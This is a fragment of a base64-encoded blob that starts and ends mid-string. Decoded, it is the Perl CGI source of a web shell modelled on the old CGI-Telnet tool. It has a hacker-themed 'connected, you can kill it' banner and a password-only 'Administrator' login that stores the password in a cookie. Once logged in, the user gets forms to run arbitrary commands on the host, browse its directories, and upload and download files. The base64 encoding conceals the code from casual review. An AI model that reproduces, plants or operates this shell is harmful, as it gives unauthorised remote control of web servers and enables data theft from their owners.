nR5cGluZ1RleHQucnVuKCkiLCB0aGlzLmludGVydmFsKTsNCiAgfSBlbHNlIHsNCgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQoJdGhpcy5jdXJyZW50Q2hhciA9IDA7DQogICAgICAgIHRoaXMucnVubmluZyA9IGZhbHNlOw0KICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsNCiAgfQ0KfQ0KPC9zY3JpcHQ+DQo8L3ByZT4NCg0KPGZvbnQgc3R5bGU9ImZvbnQ6IDE1cHQgVmVyZGFuYTsgY29sb3I6IHllbGxvdzsiPkNvcHlyaWdodCAoQykgMjAwMSBSb2hpdGFiIEJhdHJhIDwvZm9udD48YnI+PGJyPg0KPHRhYmxlIGFsaWduPSJjZW50ZXIiIGJvcmRlcj0iMSIgd2lkdGg9IjYwMCIgaGVpZ2g+DQo8dGJvZHk+PHRyPg0KPHRkIHZhbGlnbj0idG9wIiBiYWNrZ3JvdW5kPSJodHRwOi8vZGwuZHJvcGJveC5jb20vdS8xMDg2MDA1MS9pbWFnZXMvbWF0cmFuLmdpZiI+PHAgaWQ9ImhhY2siIHN0eWxlPSJtYXJnaW4tbGVmdDogM3B4OyI+DQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+IFBsZWFzZSBXYWl0IC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+IDxicj4NCg0KPGZvbnQgY29sb3I9IiMwMDk5MDAiPiBUcnlpbmcgY29ubmVjdCB0byBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD48YnI+DQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPn5cJDwvZm9udD4gQ29ubmVjdGVkICEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PC9mb250PiBDaGVja2luZyBTZXJ2ZXIgLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLiAuIC4gLjwvZm9udD4gPGJyPg0KDQo8Zm9udCBjb2xvcj0iIzAwOTkwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD4gVHJ5aW5nIGNvbm5lY3QgdG8gQ29tbWFuZCAuIC4gLiAuIC4gLiAuIC4gLiAuIC48L2ZvbnQ+PGJyPg0KDQo8Zm9udCBjb2xvcj0iI0YwMDAwMCI+PGZvbnQgY29sb3I9IiNGRkYwMDAiPiRTZXJ2ZXJOYW1lfjwvZm9udD5cJCBDb25uZWN0ZWQgQ29tbWFuZCEgPC9mb250Pjxicj4NCjxmb250IGNvbG9yPSIjMDA5OTAwIj48Zm9udCBjb2xvcj0iI0ZGRjAwMCI+JFNlcnZlck5hbWV+PGZvbnQgY29sb3I9IiNGMDAwMDAiPlwkPC9mb250PjwvZm9udD4gT0shIFlvdSBjYW4ga2lsbCBpdCE8L2ZvbnQ+DQo8L3RyPg0KPC90Ym9keT48L3RhYmxlPg0KPGJyPg0KDQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpuZXcgVHlwaW5nVGV4dChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiaGFjayIpLCAzMCwgZnVuY3Rpb24oaSl7IHZhciBhciA9IG5ldyBBcnJheSgiXyIsIiIpOyByZXR1cm4gIiAiICsgYXJbaS5sZW5ndGggJSBhci5sZW5ndGhdOyB9KTsNClR5cGluZ1RleHQucnVuQWxsKCk7DQoNCjwvc2NyaXB0Pg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQWRkIGh0bWwgc3BlY2lhbCBjaGFycw0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEh0bWxTcGVjaWFsQ2hhcnMoJCl7DQoJbXkgJHRleHQgPSBzaGlmdDsNCgkkdGV4dCA9fiBzLyYvJmFtcDsvZzsNCgkkdGV4dCA9fiBzLyIvJnF1b3Q7L2c7DQoJJHRleHQgPX4gcy8nLyYjMDM5Oy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii4kcGF0aC4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KPGJyPkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NCg0KUGFzc3dvcmQ6PGJyPg0KTG9naW4gaW5jb3JyZWN0PGJyPjxicj4NCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIGZvciBsb2dnaW5nIGluDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpbkZvcm0NCnsNCglwcmludCA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImxvZ2luIj4NCkxvZ2luIDogQWRtaW5pc3RyYXRvcjxicj4NClBhc3N3b3JkOjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icCI+DQo8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeyd9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgR2V0Q29va2llcw0Kew0KCUBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQoJZm9yZWFjaCAkY29va2llKEBodHRwY29va2llcykNCgl7DQoJCSgkaWQsICR2YWwpID0gc3BsaXQoLz0vLCAkY29va2llKTsNCgkJJENvb2tpZXN7JGlkfSA9ICR2YWw7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgc2NyZWVuIHdoZW4gdGhlIHVzZXIgbG9ncyBvdXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ291dFNjcmVlbg0Kew0KCXByaW50ICJDb25uZWN0aW9uIGNsb3NlZCBieSBmb3JlaWduIGhvc3QuPGJyPjxicj4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIExvZ3Mgb3V0IHRoZSB1c2VyIGFuZCBhbGxvd3MgdGhlIHVzZXIgdG8gbG9naW4gYWdhaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQZXJmb3JtTG9nb3V0DQp7DQoJcHJpbnQgIlNldC1Db29raWU6IFNBVkVEUFdEPTtcbiI7ICMgcmVtb3ZlIHBhc3N3b3JkIGNvb2tpZQ0KCSZQcmludFBhZ2VIZWFkZXIoInAiKTsNCgkmUHJpbnRMb2dvdXRTY3JlZW47DQoNCgkmUHJpbnRMb2dpblNjcmVlbjsNCgkmUHJpbnRMb2dpbkZvcm07DQoJJlByaW50UGFnZUZvb3RlcjsNCglleGl0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHRvIGxvZ2luIHRoZSB1c2VyLiBJZiB0aGUgcGFzc3dvcmQgbWF0Y2hlcywgaXQNCiMgZGlzcGxheXMgYSBwYWdlIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIHJ1biBjb21tYW5kcy4gSWYgdGhlIHBhc3N3b3JkIGRvZW5zJ3QNCiMgbWF0Y2ggb3IgaWYgbm8gcGFzc3dvcmQgaXMgZW50ZXJlZCwgaXQgZGlzcGxheXMgYSBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyDQojIHRvIGxvZ2luDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUGVyZm9ybUxvZ2luIA0Kew0KCWlmKCRMb2dpblBhc3N3b3JkIGVxICRQYXNzd29yZCkgIyBwYXNzd29yZCBtYXRjaGVkDQoJew0KCQlwcmludCAiU2V0LUNvb2tpZTogU0FWRURQV0Q9JExvZ2luUGFzc3dvcmQ7XG4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyOw0KCQlwcmludCAmTGlzdERpcjsNCgl9DQoJZWxzZSAjIHBhc3N3b3JkIGRpZG4ndCBtYXRjaA0KCXsNCgkJJlByaW50UGFnZUhlYWRlcigicCIpOw0KCQkmUHJpbnRMb2dpblNjcmVlbjsNCgkJaWYoJExvZ2luUGFzc3dvcmQgbmUgIiIpICMgc29tZSBwYXNzd29yZCB3YXMgZW50ZXJlZA0KCQl7DQoJCQkmUHJpbnRMb2dpbkZhaWxlZE1lc3NhZ2U7DQoNCgkJfQ0KCQkmUHJpbnRMb2dpbkZvcm07DQoJCSZQcmludFBhZ2VGb290ZXI7DQoJCWV4aXQ7DQoJfQ0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgSFRNTCBmb3JtIHRoYXQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGNvbW1hbmRzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybQ0Kew0KCW15ICRkaXI9ICI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImNvbW1hbmQiKS4iPC9zcGFuPiI7DQoJJFByb21wdCA9ICRXaW5OVCA/ICIkZGlyID4gIiA6ICI8Zm9udCBjb2xvcj0nIzY2ZmY2Nic+W2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkPC9mb250PiAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iY29tbWFuZCI+DQoNCjxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciI+DQokUHJvbXB0DQo8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNTAiIG5hbWU9ImMiPg0KPGlucHV0IGNsYXNzPSJzdWJtaXQidHlwZT0ic3VibWl0IiB2YWx1ZT0iRW50ZXIiPg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gZG93bmxvYWQgZmlsZXMNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludEZpbGVEb3dubG9hZEZvcm0NCnsNCglteSAkZGlyID0gJkFkZExpbmtEaXIoImRvd25sb2FkIik7IA0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiW2FkbWluXEAkU2VydmVyTmFtZSAkZGlyXVwkICI7DQoJcmV0dXJuIDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImRvd25sb2FkIj4NCiRQcm9tcHQgZG93bmxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0idGV4dCIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpEb3dubG9hZDogPGlucHV0IGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkJlZ2luIj4NCg0KPC9mb3JtPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gdGhhdCBhbGxvd3MgdGhlIHVzZXIgdG8gdXBsb2FkIGZpbGVzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRGaWxlVXBsb2FkRm9ybQ0Kew0KCW15ICRkaXI9ICZBZGRMaW5rRGlyKCJ1cGxvYWQiKTsNCgkkUHJvbXB0ID0gJFdpbk5UID8gIiRkaXIgPiAiIDogIlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJCAiOw0KCXJldHVybiA8PEVORDsNCjxmb3JtIG5hbWU9ImYiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KJFByb21wdCB1cGxvYWQ8YnI+PGJyPg0KRmlsZW5hbWU6IDxpbnB1dCBjbGFzcz0iZmlsZSIgdHlwZT0iZmlsZSIgbmFtZT0iZiIgc2l6ZT0iMzUiPjxicj48YnI+DQpPcHRpb25zOiAmbmJzcDs8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Im8iIGlkPSJ1cCIgdmFsdWU9Im92ZXJ3cml0ZSI+DQo8bGFiZWwgZm9yPSJ1cCI+T3ZlcndyaXRlIGlmIGl0IEV4aXN0czwvbGFiZWw+PGJyPjxicj4NClVwbG9hZDombmJzcDsmbmJzcDsmbmJzcDs8aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iQmVnaW4iPg0KPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZCIgdmFsdWU9IiRDdXJyZW50RGlyIj4NCjxpbnB1dCBjbGFzcz0ic3VibWl0IiB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJ1cGxvYWQiPg0KDQo8L2Zvcm0+DQoNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gaXMgY2FsbGVkIHdoZW4gdGhlIHRpbWVvdXQgZm9yIGEgY29tbWFuZCBleHBpcmVzLiBXZSBuZWVkIHRvDQojIHRlcm1pbmF0ZSB0aGUgc2NyaXB0IGltbWVkaWF0ZWx5LiBUaGlzIGZ1bmN0aW9uIGlzIHZhbGlkIG9ubHkgb24gVW5peC4gSXQgaXMNCiMgbmV2ZXIgY2FsbGVkIHdoZW4gdGhlIHNjcmlwdCBpcyBydW5uaW5nIG9uIE5ULg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIENvbW1hbmRUaW1lb3V0DQp7DQoJaWYoISRXaW5OVCkNCgl7DQoJCWFsYXJtKDApOw0KCQlyZXR1cm4gPDxFTkQ7DQo8L3RleHRhcmVhPg0KPGJyPjxmb250IGNvbG9yPXllbGxvdz4NCkNvbW1hbmQgZXhjZWVkZWQgbWF4aW11bSB0aW1lIG9mICRDb21tYW5kVGltZW91dER1cmF0aW9uIHNlY29uZChzKS48L2ZvbnQ+DQo8YnI+PGZvbnQgc2l6ZT0nNicgY29sb3I9cmVkPktpbGxlZCBpdCE8L2ZvbnQ+DQpFTkQNCgl9DQp9DQoNCg0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gZGlzcGxheXMgdGhlIHBhZ2UgdGhhdCBjb250YWlucyBhIGxpbmsgd2hpY2ggYWxsb3dzIHRoZSB1c2VyDQojIHRvIGRvd25sb2FkIHRoZSBzcGVjaWZpZWQgZmlsZS4gVGhlIHBhZ2UgYWxzbyBjb250YWlucyBhIGF1dG8tcmVmcmVzaA0KIyBmZWF0dXJlIHRoYXQgc3RhcnRzIHRoZSBkb3dubG9hZCBhdXRvbWF0aWNhbGx5Lg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgZmlsZW5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgZG93bmxvYWRlZA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50RG93bmxvYWRMaW5rUGFnZQ0Kew0KCWxvY2FsKCRGaWxlVXJsKSA9IEBfOw0KCW15ICRyZXN1bHQ9IiI7DQoJaWYoLWUgJEZpbGVVcmwpICMgaWYgdGhlIGZpbGUgZXhpc3RzDQoJew0KCQkjIGVuY29kZSB0aGUgZmlsZSBsaW5rIHNvIHdlIGNhbiBzZW5kIGl0IHRvIHRoZSBicm93c2VyDQoJCSRGaWxlVXJsID1+IHMvKFteYS16QS1aMC05XSkvJyUnLnVucGFjaygiSCoiLCQxKS9lZzsNCgkJJERvd25sb2FkTGluayA9ICIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZmPSRGaWxlVXJsJm89Z28iOw0KCQkkSHRtbE1ldGFIZWFkZXIgPSAiPG1ldGEgSFRUUC1FUVVJVj1cIlJlZnJlc2hcIiBDT05URU5UPVwiMTsgVVJMPSREb3dubG9hZExpbmtcIj4iOw0KCQkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJCSRyZXN1bHQgLj0gPDxFTkQ7DQpTZW5kaW5nIEZpbGUgJFRyYW5zZmVyRmlsZS4uLjxicj4NCg0KSWYgdGhlIGRvd25sb2FkIGRvZXMgbm90IHN0YXJ0IGF1dG9tYXRpY2FsbHksDQo8YSBocmVmPSIkRG93bmxvYWRMaW5rIj5DbGljayBIZXJlPC9hPg0KRU5EDQoJCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJfQ0KCWVsc2UgIyBmaWxlIGRvZXNuJ3QgZXhpc3QNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkRmlsZVVybDogJCEiOw0KCQkkcmVzdWx0IC49ICZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFRoaXMgZnVuY3Rpb24gcmVhZHMgdGhlIHNwZWNpZmllZCBmaWxlIGZyb20gdGhlIGRpc2sgYW5kIHNlbmRzIGl0IHRvIHRoZQ0KIyBicm93c2VyLCBzbyB0aGF0IGl0IGNhbiBiZSBkb3dubG9hZGVkIGJ5IHRoZSB1c2VyLg0KIyBBcmd1bWVudCAxOiBGdWxseSBxdWFsaWZpZWQgcGF0aG5hbWUgb2YgdGhlIGZpbGUgdG8gYmUgc2VudC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBTZW5kRmlsZVRvQnJvd3Nlcg0Kew0KCW15ICRyZXN1bHQgPSAiIjsNCglsb2NhbCgkU2VuZEZpbGUpID0gQF87DQoJaWYob3BlbihTRU5ERklMRSwgJFNlbmRGaWxlKSkgIyBmaWxlIG9wZW5lZCBmb3IgcmVhZGluZw0KCXsNCgkJaWYoJFdpbk5UKQ0KCQl7DQoJCQliaW5tb2RlKFNFTkRGSUxFKTsNCgkJCWJpbm1vZGUoU1RET1VUKTsNCgkJfQ0KCQkkRmlsZVNpemUgPSAoc3RhdCgkU2VuZEZpbGUpKVs3XTsNCgkJKCRGaWxlbmFtZSA9ICRTZW5kRmlsZSkgPX4gIG0hKFteL15cXF0qKSQhOw0KCQlwcmludCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXVua25vd25cbiI7DQoJCXByaW50ICJDb250ZW50LUxlbmd0aDogJEZpbGVTaXplXG4iOw0KCQlwcmludCAiQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudDsgZmlsZW5hbWU9JDFcblxuIjsNCgkJcHJpbnQgd2hpbGUoPFNFTkRGSUxFPik7DQoJCWNsb3NlKFNFTkRGSUxFKTsNCgkJZXhpdCgxKTsNCgl9DQoJZWxzZSAjIGZhaWxlZCB0byBvcGVuIGZpbGUNCgl7DQoJCSRyZXN1bHQgLj0gIkZhaWxlZCB0byBkb3dubG9hZCAkU2VuZEZpbGU6ICQhIjsNCgkJJHJlc3VsdCAuPSZQcmludEZpbGVEb3dubG9hZEZvcm07DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciBkb3dubG9hZHMgYSBmaWxlLiBJdCBkaXNwbGF5cyBhIG1lc3NhZ2UNCiMgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluayB0aHJvdWdoIHdoaWNoIHRoZSBmaWxlIGNhbiBiZSBkb3dubG9hZGVkLg0KIyBUaGlzIGZ1bmN0aW9uIGlzIGFsc28gY2FsbGVkIHdoZW4gdGhlIHVzZXIgY2xpY2tzIG9uIHRoYXQgbGluay4gSW4gdGhpcyBjYXNlLA0KIyB0aGUgZmlsZSBpcyByZWFkIGFuZCBzZW50IHRvIHRoZSBicm93c2VyLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEJlZ2luRG93bmxvYWQNCnsNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8DQoJCSghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kL